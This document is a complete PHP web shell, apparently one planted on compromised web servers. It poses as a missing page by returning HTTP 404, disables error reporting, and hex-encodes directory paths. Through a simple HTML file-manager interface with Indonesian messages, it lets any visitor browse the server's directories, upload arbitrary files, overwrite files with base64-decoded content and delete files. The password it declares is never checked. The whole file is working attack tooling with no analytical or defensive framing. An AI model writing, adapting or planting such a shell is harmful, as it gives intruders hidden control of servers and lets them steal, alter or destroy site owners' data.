<?php
http_response_code(404);
error_reporting(0);
set_time_limit(0);
session_start();
ini_set("memory_limit", "-1");
$password = "babiah";
$sessioncode = md5(__FILE__);

function get_file_permissions($file) {
    return substr(sprintf('%o', fileperms($file)), -4);
}

function is_writable_permission($file) {
    return is_writable($file);
}

function edit_file($file, $content) {
    if (file_put_contents($file, $content) !== false) {
        return true;
    } else {
        return false;
    }
}

function delete_file($file) {
    if (unlink($file)) {
        return true;
    } else {
        return false;
    }
}

function hex2bin_recursive($str) {
    return preg_replace_callback('/[0-9a-f]{2}/i', function($matches) {
        return chr(hexdec($matches[0]));
    }, $str);
}

$dir = isset($_GET['dir']) ? hex2bin_recursive($_GET['dir']) : '.';
$files = scandir($dir);
$upload_message = '';
$edit_message = '';
$delete_message = '';
$current_dir = realpath($dir);

if (isset($_FILES['file_upload'])) {
    $target_dir = $dir . '/';
    $target_file = $target_dir . basename($_FILES['file_upload']['name']);
    if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $target_file)) {
        $upload_message = 'File berhasil diunggah.';
    } else {
        $upload_message = 'Gagal mengunggah file.';
    }
}

if (isset($_POST['edit_file'])) {
    $file = $_POST['edit_file'];
    $content = file_get_contents($file);
    if ($content !== false) {
        echo '<form method="post" action="">';
        echo '<textarea name="file_content" rows="10" cols="50">' . htmlspecialchars($content) . '</textarea><br>';
        echo '<input type="hidden" name="edited_file" value="' . htmlspecialchars($file) . '">';
        echo '<input type="submit" name="submit_edit" value="Submit">';
        echo '</form>';
        echo 'Note: this private method xD if file after edit blank or error dm me lol';
    } else {
        $edit_message = 'Gagal membaca isi file.';
    }
}

if (isset($_POST['submit_edit'])) {
    $file = $_POST['edited_file'];
    $content = $_POST['file_content'];
    if (edit_file($file, base64_decode($content))) {
        $edit_message = 'File berhasil diedit.';
    } else {
        $edit_message = 'Gagal mengedit file.';
    }
}

if (isset($_POST['delete_file'])) {
    $file = $_POST['delete_file'];
    if (delete_file($file)) {
        $delete_message = 'File berhasil dihapus.';
    } else {
        $delete_message = 'Gagal menghapus file.';
    }
}

if (isset($_GET['navigate'])) {
    $target_dir = $_GET['navigate'];
    if (is_dir($target_dir)) {
        $dir = $target_dir;
        $files = scandir($dir);
    } else {
        echo '<p>Directory not found.</p>';
    }
}

?>
<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        form {
            margin-bottom: 10px;
        }
        textarea {
            width: 100%;
            height: 300px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        table, th, td {
            border: 1px solid #ccc;
        }
        th, td {
            padding: 8px;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
        }
        tr:nth-child(even) {
            background-color: #f9f9f9;
        }
        tr:hover {
            background-color: #f1f1f1;
        }
        .directory-link {
            color: blue;
            text-decoration: underline;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h2>h0d3_g4nt3ng</h2>
    <form method="post" enctype="multipart/form-data">
        <label>Upload file:</label>
        <input type="file" name="file_upload">
        <input type="submit" value="Upload">
        <input type="hidden" name="dir" value="<?php echo bin2hex($dir); ?>">
    </form>
    <?php if (!empty($upload_message)): ?>
    <p><?php echo $upload_message; ?></p>
    <?php endif; ?>
    <?php if (!empty($edit_message)): ?>
    <p><?php echo $edit_message; ?></p>
    <?php endif; ?>
    <?php if (!empty($delete_message)): ?>
    <p><?php echo $delete_message; ?></p>
    <?php endif; ?>
    <table>
        <tr>
            <th>Filename</th>
            <th>Permissions</th>
            <th>Actions</th>
        </tr>
        <?php foreach ($files as $file): ?>
        <tr>
            <td>
                <?php if (is_dir($dir . '/' . $file)): ?>
                <a class="directory-link" href="?dir=<?php echo bin2hex($dir . '/' . $file); ?>"><?php echo $file; ?></a>
                <?php else: ?>
                <?php echo $file; ?>
                <?php endif; ?>
            </td>
            <td><?php echo is_file($dir . '/' . $file) ? get_file_permissions($dir . '/' . $file) : ''; ?></td>
            <td>
                <?php if (is_file($dir . '/' . $file)): ?>
                <form action="" method="post" style="display: inline-block;">
                    <input type="hidden" name="edit_file" value="<?php echo $dir . '/' . $file; ?>">
                    <button type="submit">Edit</button>
                </form>
                <form action="" method="post" style="display: inline-block;">
                    <input type="hidden" name="delete_file" value="<?php echo $dir . '/' . $file; ?>">
                    <button type="submit">Delete</button>
                </form>
                <?php endif; ?>
            </td>
        </tr>
        <?php endforeach; ?>
    </table>
</body>
</html>